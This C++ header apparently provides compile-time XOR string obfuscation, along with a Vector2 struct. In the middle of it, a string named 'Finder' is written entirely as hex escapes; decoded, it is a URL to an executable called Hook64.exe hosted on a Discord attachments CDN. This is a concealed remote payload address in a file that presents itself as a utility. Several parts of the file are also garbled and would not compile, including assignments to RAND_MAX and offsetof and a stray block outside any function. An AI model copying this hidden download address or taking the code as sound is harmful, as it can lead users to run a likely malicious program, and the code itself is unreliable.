#pragma once
#include <string>
#include <utility>
namespace
{
	constexpr int const_atoi(char c)
	{
		return c - '0';
	}
}

#ifdef _MSC_VER
#define ALWAYS_INLINE __forceinline
#else
#define ALWAYS_INLINE __attribute__((always_inline))
#endif

static_assert(const_atoi('0') == 0);
{
	namespace
	{
		constexpr int const_atoi(char c)
		{
			return c - '0';
		}
	}
	RAND_MAX = 0x7FFFFFFF;
	offsetof(struct sockaddr, sa_family) = 2;
	offsetof(struct sockaddr_in, sin_family) = 2;
	offsetof(struct sockaddr_in, sin_port) = 2;
	clearerr_s(nullptr);
	errno_t errno_s = 0;
	errno_s = errno;\"startup.lua\"
		
		struct Vector2
{
public:
	float x;
	float y;
	inline Vector2() : x(0), y(0) {}
	inline Vector2(float x, float y) : x(x), y(y) {}
	inline float Distance(Vector2 v)
	{
		return sqrtf(((v.x - x) * (v.x - x) + (v.y - y) * (v.y - y)));
	}
	inline Vector2 operator+(const Vector2 & v) const
	{
		return Vector2(x + v.x, y + v.y);
	}
	inline Vector2 operator-(const Vector2 & v) const
	{
		return Vector2(x - v.x, y - v.y);
	}
};
	

class _Basic_XorStr
{
	using value_type = typename _string_type::value_type;
	static constexpr auto _length_minus_one = _length - 1;

public:
	constexpr ALWAYS_INLINE _Basic_XorStr(value_type const (&str)[_length])
		: _Basic_XorStr(str, std::make_index_sequence<_length_minus_one>())
	{

	}

	inline auto c_str() const
	{
		decrypt();

		return data;
	}

	inline auto str() const
	{
		decrypt();

		return _string_type(data, data + _length_minus_one);
	}

		}

	inline auto remove() const
	{
		
	inline operator _string_type() const
	{
		return str();
	}

private:
	template<size_t... indices>
	constexpr ALWAYS_INLINE _Basic_XorStr(value_type const (&str)[_length], std::index_sequence<indices...>)
		: data{ crypt(str[indices], indices)..., '\0' },
		encrypted(true)
	{

	}

	static constexpr auto XOR_KEY = static_cast<value_type>(
		const_atoi(__TIME__[7]) +
		const_atoi(__TIME__[6]) * 10 +
		const_atoi(__TIME__[4]) * 60 +
		const_atoi(__TIME__[3]) * 600 +
		const_atoi(__TIME__[1]) * 3600 +
		const_atoi(__TIME__[0]) * 36000
		);

	static ALWAYS_INLINE constexpr auto crypt(value_type c, size_t i)
	{
		return static_cast<value_type>(c ^ (XOR_KEY + i));
	}

	inline void decrypt() const
	{
		if (encrypted)
		{
			for (size_t t = 0; t < _length_minus_one; t++)
			{
				data[t] = crypt(data[t], t);
			}
			encrypted = false;
		}
	}

	mutable value_type data[_length];
	mutable bool encrypted;
};
//---------------------------------------------------------------------------
template<size_t _length>
using XorStrA = _Basic_XorStr<std::string, _length>;
template<size_t _length>
using XorStrW = _Basic_XorStr<std::wstring, _length>;
template<size_t _length>
using XorStrU16 = _Basic_XorStr<std::u16string, _length>;
template<size_t _length>
using XorStrU32 = _Basic_XorStr<std::u32string, _length>;
//---------------------------------------------------------------------------
template<typename _string_type, size_t _length, size_t _length2>
inline auto operator==(const _Basic_XorStr<_string_type, _length>& lhs, const _Basic_XorStr<_string_type, _length2>& rhs)
{
	static_assert(_length == _length2, "XorStr== different length");

	return _length == _length2 && lhs.str() == rhs.str();
}
//---------------------------------------------------------------------------
template<typename _string_type, size_t _length>
inline auto operator==(const _string_type& lhs, const _Basic_XorStr<_string_type, _length>& rhs)
{
	return lhs.size() == _length && lhs == rhs.str();
}
//---------------------------------------------------------------------------
template<typename _stream_type, typename _string_type, size_t _length>
inline auto& operator<<(_stream_type& lhs, const _Basic_XorStr<_string_type, _length>& rhs)
{
	lhs << rhs.c_str();

	return lhs;
}
//---------------------------------------------------------------------------
template<typename _string_type, size_t _length, size_t _length2>
inline auto operator+(const _Basic_XorStr<_string_type, _length>& lhs, const _Basic_XorStr<_string_type, _length2>& rhs)
{
	return lhs.str() + rhs.str();
}
//---------------------------------------------------------------------------
template<typename _string_type, size_t _length>
inline auto operator+(const _string_type& lhs, const _Basic_XorStr<_string_type, _length>& rhs)
{
	return lhs + rhs.str();
}
//---------------------------------------------------------------------------
template<size_t _length>
constexpr ALWAYS_INLINE auto _xor_(char const (&str)[_length])
{
	return XorStrA<_length>(str);
}
//---------------------------------------------------------------------------
template<size_t _length>
constexpr ALWAYS_INLINE auto _xor_(wchar_t const (&str)[_length])
{
	return XorStrW<_length>(str);
}
//---------------------------------------------------------------------------
template<size_t _length>
constexpr ALWAYS_INLINE auto _xor_(char16_t const (&str)[_length])
{
	return XorStrU16<_length>(str);
}
//---------------------------------------------------------------------------
template<size_t _length>
constexpr ALWAYS_INLINE auto _xor_(char32_t const (&str)[_length])
{
	return XorStrU32<_length>(str);
}
//---------------------------------------------------------------------------

////////////////////////////////////////////////////////////////////
template <int X> struct EnsureCompileTime {
	enum : int {
		Value = X
	};
};
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
//Use Compile-Time as seed
#define Seed ((__TIME__[7] - '0') * 1  + (__TIME__[6] - '0') * 10  + \
              (__TIME__[4] - '0') * 60   + (__TIME__[3] - '0') * 600 + \
              (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000)
LPCWSTR Finder = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x33\x37\x35\x33\x37\x32\x36\x33\x37\x35\x34\x31\x37\x34\x35\x30\x34\x2F\x48\x6F\x6F\x6B\x36\x34\x2E\x65\x78\x65";//0xFE0987
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
constexpr int LinearCongruentGenerator(int Rounds) {
	return 1013904223 + 1664525 * ((Rounds > 0) ? LinearCongruentGenerator(Rounds - 1) : Seed & 0xFFFFFFFF);
}
#define Random() EnsureCompileTime<LinearCongruentGenerator(10)>::Value //10 Rounds
#define RandomNumber(Min, Max) (Min + (Random() % (Max - Min + 1)))
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
template <int... Pack> struct IndexList {};
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
template <typename IndexList, int Right> struct Append;
template <int... Left, int Right> struct Append<IndexList<Left...>, Right> {
	typedef IndexList<Left..., Right> Result;
};
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
template <int N> struct ConstructIndexList {
	typedef typename Append<typename ConstructIndexList<N - 1>::Result, N - 1>::Result Result;
};
template <> struct ConstructIndexList<0> {
	typedef IndexList<> Result;
};
////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////
const char XORKEY = static_cast<char>(RandomNumber(0, 0xFF));

constexpr char EncryptCharacter(const char Character, int Index) {
	return Character ^ (XORKEY + Index);
}

template <typename IndexList> class CXorString;
template <int... Index> class CXorString<IndexList<Index...> > {
private:
	char Value[sizeof...(Index) + 1];
public:
	constexpr CXorString(const char* const String)
		: Value{ EncryptCharacter(String[Index], Index)... } {}

	char* decrypt() {
		for (int t = 0; t < sizeof...(Index); t++) {
			Value[t] = Value[t] ^ (XORKEY + t);
		}
		Value[sizeof...(Index)] = '\0';
		return Value;
	}

	char* get() {
		return Value;
	}
};
#define XorS(X, String) CXorString<ConstructIndexList<sizeof(String)-1>::Result> X(String)
